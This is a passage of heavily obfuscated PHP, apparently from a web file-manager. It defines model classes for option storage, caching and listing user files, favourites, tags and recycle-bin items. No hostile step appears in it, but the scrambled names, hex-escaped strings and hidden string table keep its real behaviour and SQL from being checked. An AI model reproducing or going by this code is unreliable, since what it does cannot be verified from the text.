$’ú˜·ÙÕ[$‘ª›£æ[191]] == $‘ª›£æ[591]; if ($’ú˜·ÙÕ[$‘ª›£æ[607]] == $‘ª›£æ[608]) { $ØŸÂ¢¸± = $this->sourceInfo($ëÔÅ°¼Á[$‘ª›£æ[193]]); $’ú˜·ÙÕ[$‘ª›£æ[597]] = $ØŸÂ¢¸±[$‘ª›£æ[597]]; } $±Ÿ‘Øšë[$‘ª›£æ[668]] = array($‘ª›£æ[628], $’ú˜·ÙÕ[$‘ª›£æ[597]] . $ëÔÅ°¼Á[$‘ª›£æ[193]] . $‘ª›£æ[629]); $ò¼ò²â = isset($ëÔÅ°¼Á[$‘ª›£æ[1977]]) && in_array($‘ª›£æ[591], $ëÔÅ°¼Á[$‘ª›£æ[1977]]); if (!$ò¼ò²â || !$ô¼­‘Â› || !$õòÓïÙ– || !$’ú˜·ÙÕ[$‘ª›£æ[499]]) { return; } if (!AuthModel::authCheckRoot($’ú˜·ÙÕ[$‘ª›£æ[499]][$‘ª›£æ[500]])) { return; } $Ú³İ†èÍ = $’ú˜·ÙÕ[$‘ª›£æ[582]] . $‘ª›£æ[12]; if ($Ú³İ†èÍ == $‘ª›£æ[91]) { unset($±Ÿ‘Øšë[$‘ª›£æ[668]]); $±Ÿ‘Øšë[$‘ª›£æ[191]] = self::TYPE_GROUP; return; } $©ôú‚ş” = Model($‘ª›£æ[598])->groupChildrenAll($Ú³İ†èÍ); $Û’»‚Ñå = count($©ôú‚ş”); if ($Û’»‚Ñå <= 1) { return; } $”˜Ø†è¸ = array($‘ª›£æ[193] => 0, $‘ª›£æ[191] => self::TYPE_GROUP, $‘ª›£æ[582] => array($‘ª›£æ[7], $©ôú‚ş”)); $ï˜™æÇª = $this->field($‘ª›£æ[2308])->where($”˜Ø†è¸)->limit($Û’»‚Ñå)->select(); $±Ÿ‘Øšë[$‘ª›£æ[668]] = array(); foreach ($ï˜™æÇª as $òÏ£æ¹¥) { $±Ÿ‘Øšë[$‘ª›£æ[668]][] = array($‘ª›£æ[628], $‘ª›£æ[606] . $òÏ£æ¹¥[$‘ª›£æ[194]] . $‘ª›£æ[629]); } $±Ÿ‘Øšë[$‘ª›£æ[668]][] = $‘ª›£æ[2119]; } } goto F¸Ÿ¼ƒØ·Š; e™êŠÀ™ÁÚ: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\x74\145\155\x4f\x70\164\x69\157\156"; public $field = array(); public function listData($’º³°¨¹ = false, $â ë‹‹ü = "\x6d\x6f\x64\x69\146\x79\x54\x69\x6d\x65", $¼ê–íÃŞ = false) { $‡ˆ¥ØÜ‰ =& $_SERVER[åÄ¼Ùßš]; $£¸ŠŠ“  = Model($this->modelType)->get(!1, $this->optionType, !0); $Ü«Ã€Ù = array_values($£¸ŠŠ“ ); if ($Ü«Ã€Ù && $Ü«Ã€Ù[0] && !is_array($Ü«Ã€Ù[0])) { Model($this->modelType)->cacheRemove($this->optionType); $£¸ŠŠ“  = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$£¸ŠŠ“ ) { return $’º³°¨¹ ? null : array(); } if (!$’º³°¨¹ && $’º³°¨¹ !== $‡ˆ¥ØÜ‰[231]) { $£¸ŠŠ“  = array_filter(array_values($£¸ŠŠ“ )); return array_sort_by($£¸ŠŠ“ , $â ë‹‹ü, $¼ê–íÃŞ, $‡ˆ¥ØÜ‰[484]); } return $£¸ŠŠ“ [$‡ˆ¥ØÜ‰[485] . $’º³°¨¹]; } public function insert($ºúÑ÷•¬) { $¾¯Ş§“ø =& $_SERVER[åÄ¼Ùßš]; $ºúÑ÷•¬ = array_field_key($ºúÑ÷•¬, $this->field); $‚ªÎâ‡ = Model($this->modelType)->get($¾¯Ş§“ø[486], $this->optionType . $¾¯Ş§“ø[487]); $‚ªÎâ‡ = $‚ªÎâ‡ ? $‚ªÎâ‡ : 0; $ºúÑ÷•¬[$¾¯Ş§“ø[484]] = ++$‚ªÎâ‡; $ºúÑ÷•¬[$¾¯Ş§“ø[234]] = time(); $ºúÑ÷•¬[$¾¯Ş§“ø[88]] = time(); Model($this->modelType)->set($¾¯Ş§“ø[486], $‚ªÎâ‡, $this->optionType . $¾¯Ş§“ø[487]); Model($this->modelType)->set($¾¯Ş§“ø[485] . $‚ªÎâ‡, $ºúÑ÷•¬, $this->optionType); return $‚ªÎâ‡; } public function insertArr($¤Œ›‰Êù) { $¡¸æù®Û =& $_SERVER[åÄ¼Ùßš]; if (!$¤Œ›‰Êù || !is_array($¤Œ›‰Êù)) { return !1; } $«şóŠûÖ = Model($this->modelType)->get($¡¸æù®Û[486], $this->optionType . $¡¸æù®Û[487]); $«şóŠûÖ = $«şóŠûÖ ? $«şóŠûÖ : 0; $®›ú©ë­ = array(); foreach ($¤Œ›‰Êù as $üÈ‰áŞ) { $–üãášœ = array_field_key($üÈ‰áŞ, $this->field); $–üãášœ[$¡¸æù®Û[484]] = ++$«şóŠûÖ; $–üãášœ[$¡¸æù®Û[234]] = time(); $–üãášœ[$¡¸æù®Û[88]] = time(); $®›ú©ë­[$¡¸æù®Û[485] . $«şóŠûÖ] = $–üãášœ; } Model($this->modelType)->set($¡¸æù®Û[486], $«şóŠûÖ, $this->optionType . $¡¸æù®Û[487]); Model($this->modelType)->set($®›ú©ë­, !1, $this->optionType); return $«şóŠûÖ; } public function update($€âì›ú¦, $²–ÁÉ‚) { $‚¥ºŞ´õ =& $_SERVER[åÄ¼Ùßš]; $²–ÁÉ‚ = array_field_key($²–ÁÉ‚, $this->field); $ÂÍİè = $this->listData($€âì›ú¦); if (!$ÂÍİè || !$€âì›ú¦) { return !1; } $²–ÁÉ‚ = array_merge($ÂÍİè, $²–ÁÉ‚); $²–ÁÉ‚[$‚¥ºŞ´õ[88]] = time(); return Model($this->modelType)->set($‚¥ºŞ´õ[485] . $€âì›ú¦, $²–ÁÉ‚, $this->optionType); } public function remove($á¾€“ß) { if (!$á¾€“ß) { return !1; } return Model($this->modelType)->remove($_SERVER[åÄ¼Ùßš][485] . $á¾€“ß, $this->optionType); } public function removeArr($±¾Ò­¬ï) { if (!$±¾Ò­¬ï) { return !0; } $ƒ£ç¢‹­ = array(); foreach ($±¾Ò­¬ï as $œÙ÷æã) { $ƒ£ç¢‹­[] = $_SERVER[åÄ¼Ùßš][485] . $œÙ÷æã; } return Model($this->modelType)->removeArr($ƒ£ç¢‹­, $this->optionType); } public function clear() { $ŒÓ®ê·  =& $_SERVER[åÄ¼Ùßš]; Model($this->modelType)->remove($ŒÓ®ê· [486], $this->optionType . $ŒÓ®ê· [487]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ê¼Ğ“ò£, $ü¢“Êëü) { if (!$ü¢“Êëü) { return !1; } $ı«Æ¤Òú = $this->listData(); $ı«Æ¤Òú = array_to_keyvalue($ı«Æ¤Òú, $ê¼Ğ“ò£); return isset($ı«Æ¤Òú[$ü¢“Êëü]) ? $ı«Æ¤Òú[$ü¢“Êëü] : !1; } public function findByName($®¬£¾«) { return $this->findByKey($_SERVER[åÄ¼Ùßš][32], $®¬£¾«); } protected function resetData($û”ÎËÎŒ) { $ÕÚÂ¥Öö =& $_SERVER[åÄ¼Ùßš]; if (!$û”ÎËÎŒ) { return; } $û”ÎËÎŒ = is_array($û”ÎËÎŒ) ? $û”ÎËÎŒ : array(); $ ¡öûŸ = array(); for ($„Ë¢Òß = 0; $„Ë¢Òß < count($û”ÎËÎŒ); $„Ë¢Òß++) { if (!$û”ÎËÎŒ[$„Ë¢Òß] || !$û”ÎËÎŒ[$„Ë¢Òß][$ÕÚÂ¥Öö[484]]) { continue; } $ ¡öûŸ[$ÕÚÂ¥Öö[485] . $û”ÎËÎŒ[$„Ë¢Òß][$ÕÚÂ¥Öö[484]]] = $û”ÎËÎŒ[$„Ë¢Òß]; } return Model($this->modelType)->set($ ¡öûŸ, !1, $this->optionType); } private function getAutoName($«ÆœÁšÒ) { $É¥ß§È¡ = array_to_keyvalue($this->listData(), $_SERVER[åÄ¼Ùßš][32]); if (!$É¥ß§È¡ || !isset($É¥ß§È¡[$«ÆœÁšÒ])) { return $«ÆœÁšÒ; } for ($Ï‰ØšŞ = 1; $Ï‰ØšŞ < count($É¥ß§È¡); $Ï‰ØšŞ++) { $›ŒÏ¿Íı = $«ÆœÁšÒ . "\x28{$Ï‰ØšŞ}\51"; if (!isset($É¥ß§È¡[$›ŒÏ¿Íı])) { return $›ŒÏ¿Íı; } } return $›ŒÏ¿Íı; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($¤Åô¨ Ç = false, $ÄÍĞŠ”– = '', $¼Ò¸åÌ = false, $˜÷Ãœ—Æ = true) { $Ò¤îÂ¨ =& $_SERVER[åÄ¼Ùßš]; $—‰š¿ = $this->cacheGet($ÄÍĞŠ”–); $×—âøâø = $this->optionDefault($ÄÍĞŠ”–); $×—âøâø = is_array($×—âøâø) ? $×—âøâø : array(); if (is_array($—‰š¿)) { if ($˜÷Ãœ—Æ) { $—‰š¿ = array_merge($×—âøâø, $—‰š¿); } return $¤Åô¨ Ç ? isset($—‰š¿[$¤Åô¨ Ç]) ? $—‰š¿[$¤Åô¨ Ç] : null : $—‰š¿; } $ñŠ—ğÁ® = $this->filterWhere(array($Ò¤îÂ¨[33] => $ÄÍĞŠ”–)); $—‰š¿ = $this->where($ñŠ—ğÁ®)->select(); $—‰š¿ = array_to_keyvalue($—‰š¿, $Ò¤îÂ¨[97], $Ò¤îÂ¨[452]); foreach ($—‰š¿ as $î‘¶²òÁ => $¸ ¹ş«») { if ($¼Ò¸åÌ || in_array($î‘¶²òÁ, $this->jsonField)) { $—‰š¿[$î‘¶²òÁ] = json_decode($¸ ¹ş«», !0); } } $this->cacheSet($ÄÍĞŠ”–, $—‰š¿); if ($˜÷Ãœ—Æ) { $—‰š¿ = array_merge($×—âøâø, $—‰š¿); } return $¤Åô¨ Ç ? $—‰š¿[$¤Åô¨ Ç] : $—‰š¿; } public function set($ÎôÖË“, $¹†êÊŒ = false, $Šåï±« = '') { $¶Ğåş·  =& $_SERVER[åÄ¼Ùßš]; if (!$ÎôÖË“) { return !0; } $ª‘ñ¾ù’ = $this->get(!1, $Šåï±«, !1, !1); $ª‘ñ¾ù’ = is_array($ª‘ñ¾ù’) ? $ª‘ñ¾ù’ : array(); $áù­ü«§ = array(); $Ã”ˆêñ = array(); $Íí’Ğß = array(); $ıËæ = is_array($ÎôÖË“) ? $ÎôÖË“ : array($ÎôÖË“ => $¹†êÊŒ); $‚Â‹‡À¢ = $this->filterWhere(array($¶Ğåş· [33] => $Šåï±«)); foreach ($ıËæ as $Ìë®¶õ¿ => $ò—ÁÄ¬) { if (is_array($ò—ÁÄ¬)) { $ò—ÁÄ¬ = json_encode_force($ò—ÁÄ¬); } $this->checkLength($ò—ÁÄ¬, !1, $this->tableName . $¶Ğåş· [4] . $ÎôÖË“); $ò—ÁÄ¬ = self::textEncode($ò—ÁÄ¬); if (array_key_exists($Ìë®¶õ¿, $ª‘ñ¾ù’)) { $Ï´ÜÆ¢  = is_array($ª‘ñ¾ù’[$Ìë®¶õ¿]) ? json_encode_force($ª‘ñ¾ù’[$Ìë®¶õ¿]) : $ª‘ñ¾ù’[$Ìë®¶õ¿]; $Ï´ÜÆ¢  = self::textEncode($Ï´ÜÆ¢ ); if ($Ï´ÜÆ¢  === $ò—ÁÄ¬) { continue; } $Ã”ˆêñ[] = array($¶Ğåş· [97], $Ìë®¶õ¿, $¶Ğåş· [452], $ò—ÁÄ¬, $¶Ğåş· [88], time()); } else { $™­Ãé´œ = array($¶Ğåş· [33] => $Šåï±«, $¶Ğåş· [97] => $Ìë®¶õ¿, $¶Ğåş· [452] => $ò—ÁÄ¬); $áù­ü«§[] = $this->filterWhere($™­Ãé´œ); } } if (!$áù­ü«§ && !$Ã”ˆêñ) { return !0; } $this->cacheRemove($Šåï±«); $¦€ù«ùâ = $this->cacheKey($¶Ğåş· [488]); CacheLock::lock($¦€ù«ùâ); if ($áù­ü«§) { $this->addAll($áù­ü«§); } if ($Ã”ˆêñ) { $this->saveAll($Ã”ˆêñ, $‚Â‹‡À¢); } CacheLock::unlock($¦€ù«ùâ); return !0; } protected function optionDefault($Íîã„Ò = '') { return !1; } public function setDeep($æš¾­÷, $ì†°€äğ = false, $½×ÂïÑæ = '') { $†ıæîêó = explode($_SERVER[åÄ¼Ùßš][10], $æš¾­÷); $»¡†ªµ® = $this->get(); array_set_value($»¡†ªµ®, $æš¾­÷, $ì†°€äğ); $this->set($†ıæîêó[0], $»¡†ªµ®[$†ıæîêó[0]], $½×ÂïÑæ); } public function remove($×ŸŠÁİ, $¶áıÒË = '') { $ëÈç»·Å =& $_SERVER[åÄ¼Ùßš]; $this->cacheRemove($¶áıÒË); $êÛú¬§ˆ = $this->filterWhere(array($ëÈç»·Å[97] => $×ŸŠÁİ, $ëÈç»·Å[33] => $¶áıÒË)); if (is_null($×ŸŠÁİ)) { unset($êÛú¬§ˆ[$ëÈç»·Å[97]]); } return $this->where($êÛú¬§ˆ)->delete(); } public function removeArr($‰²…ÁÆ¤, $ší™£–ˆ = '') { $¥´¶İÜ =& $_SERVER[åÄ¼Ùßš]; if (!$‰²…ÁÆ¤ || !is_array($‰²…ÁÆ¤)) { return !0; } $this->cacheRemove($ší™£–ˆ); $¸Å…Á‹¥ = $this->filterWhere(array($¥´¶İÜ[33] => $ší™£–ˆ, $¥´¶İÜ[97] => array($¥´¶İÜ[7], $‰²…ÁÆ¤))); return $this->where($¸Å…Á‹¥)->delete(); } public function cacheSet($ŒÚ¥„Ââ, $–ü’¡Àó = false) { return Cache::set($this->cacheKey($ŒÚ¥„Ââ), $–ü’¡Àó); } public function cacheGet($´²‘­Ş¸) { return Cache::get($this->cacheKey($´²‘­Ş¸)); } public function cacheRemove($ËîÒŒçè) { return Cache::remove($this->cacheKey($ËîÒŒçè)); } protected function filterWhere($Àîç´ú) { return $Àîç´ú; } protected function cacheKey($áˆëÈµ) { return $áˆëÈµ; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\165\x72\x63\x65"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\x4e\x61\x6d\x65" => "\x69\x6f\137\163\157\165\x72\143\145\x5f\155\145\x74\141", "\x6d\x65\164\141\x46\151\x65\x6c\x64" => "\163\x6f\x75\162\143\x65\111\x44"); protected $dataAuto = array(array("\x6d\x6f\144\151\146\x79\x54\x69\x6d\x65", "\x74\x69\155\x65", "\x69\x6e\x73\x65\162\x74", "\x66\165\x6e\x63\164\x69\157\156"), array("\x63\x72\x65\x61\164\x65\x54\x69\155\x65", "\x74\x69\x6d\x65", "\151\156\163\145\162\x74", "\x66\165\156\143\x74\151\157\156"), array("\166\x69\145\167\124\151\x6d\x65", "\164\x69\x6d\145", "\x69\x6e\163\x65\162\x74", "\x66\x75\156\x63\x74\x69\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ê˜¯ÏÑ) { return $this->listSource(array($_SERVER[åÄ¼Ùßš][489] => $ê˜¯ÏÑ)); } public function typeName($ÑŒâß„„) { static $ÓÜ•ó¸° = array(self::TYPE_SYSTEM => "\163\171\163\x74\145\155", self::TYPE_USER => "\165\163\145\162", self::TYPE_GROUP => "\147\x72\x6f\x75\x70"); return $ÓÜ•ó¸°[$ÑŒâß„„ . $_SERVER[åÄ¼Ùßš][12]]; } public function sourceListInfo($±ó¾ŞØø, $‡ıûıÖŠ = false) { $Ê¸ãƒ =& $_SERVER[åÄ¼Ùßš]; $±ó¾ŞØø = $±ó¾ŞØø ? $±ó¾ŞØø : array(); $±ó¾ŞØø = array_filter(array_unique($±ó¾ŞØø)); if (!$±ó¾ŞØø) { return array(); } $ŠÓÑòÁ³ = $this->where(array($Ê¸ãƒ[194] => array($Ê¸ãƒ[7], $±ó¾ŞØø)))->select(); $this->_listDataApply($ŠÓÑòÁ³, $‡ıûıÖŠ); return array_to_keyvalue($ŠÓÑòÁ³, $Ê¸ãƒ[194]); } public function pathInfoFilter(&$î‘Äà) { $Å›˜”»È =& $_SERVER[åÄ¼Ùßš]; static $È•œ¬÷œ = false; static $¾³ò²œì = false; static $ÃÁˆºğ = false; if (!$È•œ¬÷œ) { $¬İèì ° = $Å›˜”»È[490]; $¬İèì ° .= $Å›˜”»È[491]; $¬İèì ° .= $Å›˜”»È[492]; $³Á¸šü© = $Å›˜”»È[493]; $æàÁıªò = explode($Å›˜”»È[50], $³Á¸šü©); $È•œ¬÷œ = explode($Å›˜”»È[50], $¬İèì °); $¾³ò²œì = array(); foreach ($È•œ¬÷œ as $êÊ¸„Ã÷) { if (in_array($êÊ¸„Ã÷, $æàÁıªò)) { continue; } $¾³ò²œì[] = $êÊ¸„Ã÷; } $ÃÁˆºğ = explode($Å›˜”»È[50], $Å›˜”»È[494]); } foreach ($ÃÁˆºğ as $‹ŸŒµ×ß) { if (isset($î‘Äà[$‹ŸŒµ×ß])) { $î‘Äà[$‹ŸŒµ×ß] = intval($î‘Äà[$‹ŸŒµ×ß]); } } $î‘Äà[$Å›˜”»È[87]] = $Å›˜”»È[495] . $î‘Äà[$Å›˜”»È[194]] . $Å›˜”»È[496]; $î‘Äà[$Å›˜”»È[33]] = $î‘Äà[$Å›˜”»È[497]] == 1 ? $Å›˜”»È[78] : $Å›˜”»È[233]; $î‘Äà[$Å›˜”»È[191]] = $this->typeName($î‘Äà[$Å›˜”»È[191]]); if ($î‘Äà[$Å›˜”»È[497]] != 1) { $î‘Äà[$Å›˜”»È[169]] = $î‘Äà[$Å›˜”»È[498]]; unset($î‘Äà[$Å›˜”»È[498]]); } $ù’÷¢î = $È•œ¬÷œ; if (isset($î‘Äà[$Å›˜”»È[499]]) && $î‘Äà[$Å›˜”»È[499]][$Å›˜”»È[500]] == -1) { $ù’÷¢î = $¾³ò²œì; } $î‘Äà = array_field_key($î‘Äà, $ù’÷¢î); return $î‘Äà; } public function listUserFav() { $Æ·ôª¶¯ =& $_SERVER[åÄ¼Ùßš]; $ÏãÉ¼¡— = Model($Æ·ôª¶¯[501])->listData(); $şò•óû¿ = array_filter_by_field($ÏãÉ¼¡—, $Æ·ôª¶¯[33], $Æ·ôª¶¯[502]); $şò•óû¿ = array_to_keyvalue($şò•óû¿, $Æ·ôª¶¯[12], $Æ·ôª¶¯[87]); if ($şò•óû¿) { $à³»œ‹ = $this->listSource(array($Æ·ôª¶¯[503] => array($Æ·ôª¶¯[504], $şò•óû¿))); } $à³»œ‹ = array_to_keyvalue($à³»œ‹[$Æ·ôª¶¯[447]], $Æ·ôª¶¯[194]); foreach ($ÏãÉ¼¡— as &$‘£…©úğ) { $‘£…©úğ = array($Æ·ôª¶¯[505] => $‘£…©úğ[$Æ·ôª¶¯[484]], $Æ·ôª¶¯[506] => $‘£…©úğ[$Æ·ôª¶¯[32]], $Æ·ôª¶¯[507] => $‘£…©úğ[$Æ·ôª¶¯[87]], $Æ·ôª¶¯[508] => $‘£…©úğ[$Æ·ôª¶¯[33]], $Æ·ôª¶¯[509] => $‘£…©úğ[$Æ·ôª¶¯[234]], $Æ·ôª¶¯[510] => $‘£…©úğ[$Æ·ôª¶¯[88]]); if ($‘£…©úğ[$Æ·ôª¶¯[33]] == $Æ·ôª¶¯[502] && $à³»œ‹[$‘£…©úğ[$Æ·ôª¶¯[87]]]) { $‘£…©úğ[$Æ·ôª¶¯[90]] = $à³»œ‹[$‘£…©úğ[$Æ·ôª¶¯[87]]]; } } unset($‘£…©úğ); return $ÏãÉ¼¡—; } public function listUserTag($¸¹¦„²œ) { $ÉÄ€¼÷ =& $_SERVER[åÄ¼Ùßš]; if ($¸¹¦„²œ && !is_array($¸¹¦„²œ)) { $¸¹¦„²œ = array($¸¹¦„²œ); } $ ß­Õ¼¥ = Model($ÉÄ€¼÷[511])->listData(); $¯ÛÓä˜” = array(); $±Š¾ = array(); foreach ($ ß­Õ¼¥ as $ğË›Šè²) { $’“¦ñÀ = $ğË›Šè²[$ÉÄ€¼÷[87]]; if (!$’“¦ñÀ) { continue; } if (!isset($±Š¾[$’“¦ñÀ])) { $±Š¾[$’“¦ñÀ] = array(); } $±Š¾[$’“¦ñÀ][] = $ğË›Šè²[$ÉÄ€¼÷[512]]; $¯ÛÓä˜”[$ğË›Šè²[$ÉÄ€¼÷[87]]] = $ğË›Šè²; } $ËˆŒãØ = array(); $Ô×Éú„æ = array(); $ÑÓİºøİ = array(); foreach ($±Š¾ as $–ÌÑ => $Ï¦ÖŞİÀ) { $Ê·ô¨ù§ = !0; if (!$¸¹¦„²œ) { $ËˆŒãØ[] = $–ÌÑ; continue; } foreach ($¸¹¦„²œ as $¸ÅœÍª¯) { if (!in_array($¸ÅœÍª¯, $Ï¦ÖŞİÀ)) { $Ê·ô¨ù§ = !1; break; } } if (!$Ê·ô¨ù§) { continue; } if (!is_numeric($–ÌÑ)) { $²•¬•è = $¯ÛÓä˜”[$–ÌÑ]; $šèš™­Á = array($ÉÄ€¼÷[32] => $²•¬•è[$ÉÄ€¼÷[32]], $ÉÄ€¼÷[87] => $²•¬•è[$ÉÄ€¼÷[87]], $ÉÄ€¼÷[33] => $²•¬•è[$ÉÄ€¼÷[33]], $ÉÄ€¼÷[90] => array($ÉÄ€¼÷[513] => 1), $ÉÄ€¼÷[235] => !0); if ($²•¬•è[$ÉÄ€¼÷[33]] == $ÉÄ€¼÷[233]) { $ÑÓİºøİ[] = $šèš™­Á; } if ($²•¬•è[$ÉÄ€¼÷[33]] == $ÉÄ€¼÷[78]) { $Ô×Éú„æ[] = $šèš™­Á; } continue; } $ËˆŒãØ[] = $–ÌÑ; } if ($ËˆŒãØ) { $€Øë¢‘² = $this->listSource(array($ÉÄ€¼÷[503] => array($ÉÄ€¼÷[504], $ËˆŒãØ))); } $€Øë¢‘² = $€Øë¢‘² ? $€Øë¢‘² : array($ÉÄ€¼÷[85] => array(), $ÉÄ€¼÷[86] => array()); $€Øë¢‘²[$ÉÄ€¼÷[85]] = array_merge($€Øë¢‘²[$ÉÄ€¼÷[85]], $Ô×Éú„æ); $€Øë¢‘²[$ÉÄ€¼÷[86]] = array_merge($€Øë¢‘²[$ÉÄ€¼÷[86]], $ÑÓİºøİ); if (isset($€Øë¢‘²[$ÉÄ€¼÷[444]]) && count($ËˆŒãØ) == $€Øë¢‘²[$ÉÄ€¼÷[444]][$ÉÄ€¼÷[445]]) { return $€Øë¢‘²; } $Ë¦ìÏØÂ = array(); $îáÄÂü½ = array_to_keyvalue($€Øë¢‘²[$ÉÄ€¼÷[85]], $ÉÄ€¼÷[12], $ÉÄ€¼÷[194]); $ÜŸÑÊè = array_to_keyvalue($€Øë¢‘²[$ÉÄ€¼÷[86]], $ÉÄ€¼÷[12], $ÉÄ€¼÷[194]); $í©¯–æ± = array_merge($ÜŸÑÊè, $îáÄÂü½); foreach ($ËˆŒãØ as $’“¦ñÀ) { if (!in_array($’“¦ñÀ, $í©¯–æ±)) { $Ë¦ìÏØÂ[] = $’“¦ñÀ; } } if ($Ë¦ìÏØÂ) { Model($ÉÄ€¼÷[514])->removeBySource($Ë¦ìÏØÂ); } return $€Øë¢‘²; } public function listUserRecycle() { $ãğ…Ì¨è =& $_SERVER[åÄ¼Ùßš]; $€¿†ÒõÖ = Model($ãğ…Ì¨è[515])->listData(); if (!$€¿†ÒõÖ) { return array(); } $ÚêƒóÇ… = array($ãğ…Ì¨è[503] => array($ãğ…Ì¨è[504], $€¿†ÒõÖ), $ãğ…Ì¨è[516] => 1); return $this->listSource($ÚêƒóÇ…); } public function listSource($ ö£ ú, $Øà §ê = 3000, $‘àãÁş° = false) { $ÅàŠ²½ =& $_SERVER[åÄ¼Ùßš]; if (!isset($ ö£ ú[$ÅàŠ²½[517]])) { $ ö£ ú[$ÅàŠ²½[517]] = 0; } if (isset($ ö£ ú[$ÅàŠ²½[193]]) && $ ö£ ú[$ÅàŠ²½[193]] == $ÅàŠ²½[231]) { $ ö£ ú[$ÅàŠ²½[498]] = array($ÅàŠ²½[465], $ÅàŠ²½[12]); } if (isset($ ö£ ú[$ÅàŠ²½[193]])) { $ ö£ ú[$ÅàŠ²½[193]] = intval($ ö£ ú[$ÅàŠ²½[193]]); } $÷¸¬Ò¿Û = $ÅàŠ²½[518]; $å²ı£Õ = $this->field($÷¸¬Ò¿Û)->_makeOrder()->where($ ö£ ú)->selectPage($Øà §ê); $this->_listPageCheck($å²ı£Õ, $÷¸¬Ò¿Û, $ ö£ ú); $this->_listDataApply($å²ı£Õ[$ÅàŠ²½[447]], $‘àãÁş°); $this->_listMake($å²ı£Õ); return $å²ı£Õ; } private function _listPageCheck(&$ªçõÕÂ™, $˜…—®Áö, $œ¾ú‡°”) { $ˆØÚ… =& $_SERVER[åÄ¼Ùßš]; if (!is_array($ªçõÕÂ™[$ˆØÚ…[444]])) { return; } $»èïƒĞ = $ªçõÕÂ™[$ˆØÚ…[444]]; if ($»èïƒĞ[$ˆØÚ…[446]] <= 1) { return; } if ($»èïƒĞ[$ˆØÚ…[445]] >= 100000) { return; } if (Model($ˆØÚ…[519])->get($ˆØÚ…[520]) != $ˆØÚ…[521]) { return; } $˜…—®Áö = str_replace(array($ˆØÚ…[53], $ˆØÚ…[419], $ˆØÚ…[288]), $ˆØÚ…[12], $˜…—®Áö); $˜…—®Áö = $ˆØÚ…[522] . str_replace($ˆØÚ…[50], $ˆØÚ…[523], $˜…—®Áö) . $ˆØÚ…[524]; $¤¢ÊñÌÌ = $ˆØÚ…[525]; $¤¢ÊñÌÌ = $¤¢ÊñÌÌ . $ˆØÚ…[526]; $œÆ€á‰» = $»èïƒĞ[$ˆØÚ…[441]] * ($»èïƒĞ[$ˆØÚ…[430]] - 1) . $ˆØÚ…[50] . $»èïƒĞ[$ˆØÚ…[441]]; $ØÖåÂÒ = $this->_makeOrder(!0); $”Ëêê¤ = $ˆØÚ…[522] . str_replace($ˆØÚ…[50], $ˆØÚ…[523], $ØÖåÂÒ[0]); if (strpos($”Ëêê¤, $ˆØÚ…[527])) { $”Ëêê¤ = str_replace($ˆØÚ…[527], $ˆØÚ…[528], $”Ëêê¤); } else { $”Ëêê¤ .= $ˆØÚ…[529] . $ØÖåÂÒ[1]; } $Ü©¥šëß = array(); foreach ($œ¾ú‡°” as $ÉÎ¹êâ” => $ü¸Ó ÄÑ) { $Ü©¥šëß[$ˆØÚ…[522] . $ÉÎ¹êâ”] = $ü¸Ó ÄÑ; } $this->alias($ˆØÚ…[530])->field($˜…—®Áö)->limit($œÆ€á‰»)->order($”Ëêê¤); $³¨Á®³Ú = $this->join($¤¢ÊñÌÌ)->where($Ü©¥šëß)->select(); if ($³¨Á®³Ú) { $ªçõÕÂ™[$ˆØÚ…[447]] = $³¨Á®³Ú; } } protected function _makeOrder($•Îé“â¥ = false) { $¶Á—ƒ­µ =& $_SERVER[åÄ¼Ùßš]; $ßéç = Model($¶Á—ƒ­µ[531])->get($¶Á—ƒ­µ[532]); $íÜé¬± = Model($¶Á—ƒ­µ[531])->get($¶Á—ƒ­µ[533]); $íŠÓê…« = array($¶Á—ƒ­µ[534] => $¶Á—ƒ­µ[535], $¶Á—ƒ­µ[536] => $¶Á—ƒ­µ[537]); $åĞâ ÍÔ = array($¶Á—ƒ­µ[32] => $¶Á—ƒ­µ[32], $¶Á—ƒ­µ[79] => $¶Á—ƒ­µ[79], $¶Á—ƒ­µ[169] => $¶Á—ƒ­µ[498], $¶Á—ƒ­µ[538] => $¶Á—ƒ­µ[538], $¶Á—ƒ­µ[539] => $¶Á—ƒ­µ[540], $¶Á—ƒ­µ[234] => $¶Á—ƒ­µ[234], $¶Á—ƒ­µ[88] => $¶Á—ƒ­µ[88]); $Àòîö©• = Input::get($¶Á—ƒ­µ[541], $¶Á—ƒ­µ[7], $ßéç, array_keys($åĞâ ÍÔ)); $ñÖ¯øœã = Input::get($¶Á—ƒ­µ[542], $¶Á—ƒ­µ[7], $íÜé¬±, array_keys($íŠÓê…«)); if (!in_array($Àòîö©•, array_keys($åĞâ ÍÔ))) { $Àòîö©• = $¶Á—ƒ­µ[32]; } if (!in_array($ñÖ¯øœã, array_keys($íŠÓê…«))) { $Àòîö©• = $¶Á—ƒ­µ[534]; } if ($Àòîö©• == $¶Á—ƒ­µ[32]) { } $âÅùóÖ¨ = $¶Á—ƒ­µ[543] . $åĞâ ÍÔ[$Àòîö©•] . $¶Á—ƒ­µ[53] . $íŠÓê…«[$ñÖ¯øœã]; $âÅùóÖ¨ = rtrim(trim($âÅùóÖ¨), $¶Á—ƒ­µ[50]); if ($•Îé“â¥) { return array($âÅùóÖ¨, $íŠÓê…«[$ñÖ¯øœã]); } return $this->order($âÅùóÖ¨); } protected function _listDataApplyItem($ÚÏ¤Å¿³, $¦ ê¥¤Š = false) { $áƒ‘„ô = array($ÚÏ¤Å¿³); $this->_listDataApply($áƒ‘„ô, $¦ ê¥¤Š); return $áƒ‘„ô[0]; } protected function _listDataApply(&$çÍˆÊä, $ÓÂÜ±Í¾ = false) { $Ñ¢òĞÒ¤ =& $_SERVER[åÄ¼Ùßš]; if (!$çÍˆÊä) { $çÍˆÊä = array(); return; } $æ‚ôÏÕ = array_to_keyvalue($çÍˆÊä, $Ñ¢òĞÒ¤[12], $Ñ¢òĞÒ¤[194]); $æ‚ôÏÕ = array_unique($æ‚ôÏÕ); $æ‚ôÏÕ = array_to_int($æ‚ôÏÕ); $this->_listSourceCache($çÍˆÊä); if (!$ÓÂÜ±Í¾) { $this->_listAppendMeta($çÍˆÊä, $æ‚ôÏÕ); 